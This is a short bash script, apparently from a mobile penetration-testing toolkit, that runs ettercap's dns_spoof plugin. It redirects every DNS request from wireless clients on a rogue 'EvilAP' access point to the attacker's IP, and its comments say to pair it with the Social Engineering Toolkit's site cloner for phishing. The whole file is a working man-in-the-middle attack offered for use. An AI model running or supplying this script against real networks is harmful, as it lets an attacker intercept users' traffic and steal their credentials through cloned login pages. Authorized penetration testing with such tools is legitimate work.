#!/bin/bash
#Script to use ettercap to redirect all dns traffic back to the pwnpad
#use with Social Engineering Toolkit (site cloner)

##################################################

  clear
  echo "    *CURRENTLY ONLY WORKS WHEN EVILAP IS RUNNING*"
  echo 
  echo "    EvilAP Ettercap-NG 0.8.0 DNS Spoofing script"
  echo
  echo "    NOTE: All DNS requests from wireless clients connect to EvilAP "
  echo "    will be redirected to IP of EvilAP (192.168.7.1)"
  echo
  echo "    Use with Social Engineering Toolkit (site cloner use 192.168.7.1)"

ettercap -i at0 -T -q -P dns_spoof
